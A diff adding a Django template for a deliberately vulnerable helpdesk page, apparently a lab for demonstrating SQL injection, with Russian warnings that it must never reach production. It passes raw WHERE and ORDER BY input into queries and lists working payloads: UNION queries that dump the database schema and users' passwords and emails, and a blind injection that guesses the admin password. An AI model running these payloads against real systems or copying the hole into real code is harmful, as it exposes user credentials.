@@ -1,0 +1,141 @@
+{% extends "helpdesk/base.html" %}
+
+{% block title %}SQL Injection Test{% endblock %}
+
+{% block content %}
+<div class="container mt-4">
+    <div class="alert alert-danger">
+        <h4>⚠ КРИТИЧЕСКАЯ УЯЗВИМОСТЬ: SQL INJECTION</h4>
+        <p>Эта страница содержит намеренную SQL инъекцию. НИКОГДА не используйте в production!</p>
+    </div>
+
+    <h1 class="mb-4">💉 Тест SQL инъекции</h1>
+    
+    <!-- Форма SQL инъекции -->
+    <div class="card mb-4 border-danger">
+        <div class="card-header bg-danger text-white">
+            <h5 class="mb-0">Введите SQL условие</h5>
+        </div>
+        <div class="card-body">
+            <form method="GET" class="row g-3">
+                <div class="col-md-8">
+                    <label class="form-label">WHERE условие:</label>
+                    <input type="text" name="where" class="form-control" 
+                           value="{{ request.GET.where|default:'1=1' }}"
+                           placeholder="1=1 OR title LIKE '%test%'">
+                    <small class="text-muted">SQL выражение для WHERE. ОПАСНО!</small>
+                </div>
+                <div class="col-md-4">
+                    <label class="form-label">ORDER BY:</label>
+                    <input type="text" name="order" class="form-control" 
+                           value="{{ request.GET.order|default:'id' }}"
+                           placeholder="id, title, created DESC">
+                    <small class="text-muted">Поле для сортировки</small>
+                </div>
+                
+                <div class="col-12">
+                    <button type="submit" class="btn btn-danger">Выполнить SQL запрос</button>
+                    <a href="{% url 'helpdesk:sql_injection_test' %}" class="btn btn-secondary">Сбросить</a>
+                </div>
+            </form>
+        </div>
+    </div>
+    
+    <!-- Примеры эксплойтов -->
+    <div class="card mb-4">
+        <div class="card-header bg-warning">
+            <h5 class="mb-0">📚 Примеры SQL инъекций</h5>
+        </div>
+        <div class="card-body">
+            <div class="row">
+                <div class="col-md-6">
+                    <h6>1. Получить все тикеты:</h6>
+                    <code class="d-block mb-2">where=1=1</code>
+                    
+                    <h6 class="mt-3">2. Получить тикеты с определённым текстом:</h6>
+                    <code class="d-block mb-2">where=title LIKE '%secret%'</code>
+                    
+                    <h6 class="mt-3">3. Получить тикеты с высоким приоритетом:</h6>
+                    <code class="d-block mb-2">where=priority > 7</code>
+                </div>
+                <div class="col-md-6">
+                    <h6>4. UNION атака (структура БД):</h6>
+                    <code class="d-block mb-2 small">where=1=1 UNION SELECT name, sql, null FROM sqlite_master WHERE type='table'</code>
+                    
+                    <h6 class="mt-3">5. UNION атака (данные пользователей):</h6>
+                    <code class="d-block mb-2 small">where=1=1 UNION SELECT username, password, email FROM account_myuser</code>
+                    
+                    <h6 class="mt-3">6. Blind SQL injection:</h6>
+                    <code class="d-block mb-2 small">where=1=1 AND (SELECT substr(password,1,1) FROM account_myuser WHERE username='admin')='a'</code>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Отладочная информация -->
+    {% if query %}
+    <div class="card mb-4">
+        <div class="card-header bg-info text-white">
+            <h5 class="mb-0">Сгенерированный SQL запрос</h5>
+        </div>
+        <div class="card-body">
+            <pre class="bg-dark text-light p-3 rounded"><code>{{ query }}</code></pre>
+        </div>
+    </div>
+    {% endif %}
+    
+    <!-- Ошибка -->
+    {% if error %}
+    <div class="alert alert-danger">
+        <h5>❌ Ошибка SQL:</h5>
+        <pre class="mb-0">{{ error }}</pre>
+    </div>
+    {% endif %}
+    
+    <!-- Результаты -->
+    <h3 class="mb-3">Результаты: {{ tickets|length }} записей</h3>
+    
+    {% if tickets %}
+    <div class="table-responsive">
+        <table class="table table-striped table-hover">
+            <thead class="table-dark">
+                <tr>
+                    <th>Колонка 1</th>
+                    <th>Колонка 2</th>
+                    <th>Колонка 3</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for ticket in tickets %}
+                <tr>
+                    <td>{{ ticket.0|default:"NULL" }}</td>
+                    <td>{{ ticket.1|default:"NULL" }}</td>
+                    <td>{{ ticket.2|default:"NULL" }}</td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
+    {% elif not error %}
+    <div class="alert alert-info">
+        <p class="mb-0">Нет результатов. Попробуйте другой SQL запрос.</p>
+    </div>
+    {% endif %}
+</div>
+
+<script>
+// Примеры SQL инъекций для быстрого тестирования
+const sqlExamples = [
+    {name: "Все тикеты", sql: "1=1"},
+    {name: "Секретные тикеты", sql: "title LIKE '%secret%'"},
+    {name: "High priority", sql: "priority > 7"},
+    {name: "Структура БД", sql: "1=1 UNION SELECT name, sql, null FROM sqlite_master WHERE type='table'"},
+    {name: "Пользователи", sql: "1=1 UNION SELECT username, password, email FROM account_myuser"}
+];
+
+function loadExample(index) {
+    const example = sqlExamples[index];
+    document.querySelector('input[name="where"]').value = example.sql;
+}
+</script>
+{% endblock %}
